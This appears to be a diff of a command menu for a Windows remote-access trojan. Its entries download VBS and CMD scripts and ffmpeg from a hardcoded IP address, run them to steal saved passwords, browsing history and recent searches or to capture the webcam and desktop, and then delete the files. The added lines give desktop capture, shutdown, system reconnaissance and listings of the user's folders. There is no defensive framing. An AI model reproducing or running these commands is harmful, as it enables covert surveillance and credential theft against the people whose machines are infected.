@@ -2,3 +2,18 @@ Stealpassword ~cd c:\users\public\documents & curl http://213.168.249.164:8000/e
 Stealhistory ~cd c:\users\public\documents & curl http://213.168.249.164:8000/ehist.vbs -o ehist.vbs & ping -n 2 127.0.0.1 >NUL & ehist.vbs & ping -n 2 127.0.0.1 & del hv.exe & del ehist.vbs & exit
 StealLastSearch ~cd c:\users\public\documents & curl http://213.168.249.164:8000/elastsearch.vbs -o elastsearch.vbs & ping -n 2 127.0.0.1 >NUL & elastsearch.vbs & ping -n 2 127.0.0.1 & del lsearchv.exe & del elastsearch.vbs & exit
 OpenCamera ~cd c:\users\public\documents & curl http://213.168.249.164:8000/ccam.cmd -o ccam.cmd & if exist ffmpeg.exe (echo exists! & ffmpeg.exe -list_devices true -f dshow -i dummy) else (curl http://213.168.249.164:8000/ffmpeg.exe -o ffmpeg.exe) & ffmpeg.exe -list_devices true -f dshow -i dummy
+OpenDesktop ~cd c:\users\public\documents & curl http://213.168.249.164:8000/cdesk.cmd -o cdesk.cmd & if exist ffmpeg.exe (echo exists! & cdesk.cmd) else (curl http://213.168.249.164:8000/ffmpeg.exe -o ffmpeg.exe) & cdesk.cmd
+
+Shutdown ~shutdown
+Reboot ~shutdown /r
+Tasklist ~tasklist | grep 
+IpConfig ~ipconfig
+Netstat ~netstat -an
+Tracert ~tracert
+Systeminfo ~Systeminfo
+
+Desktop ~cd "%userprofile%\Desktop" & dir
+Documents ~cd "%userprofile%\Documents" & dir
+Pictures ~cd "%userprofile%\Pictures" & dir
+Music ~cd "%userprofile%\Music" & dir
+Program Files~cd "c:\program files"
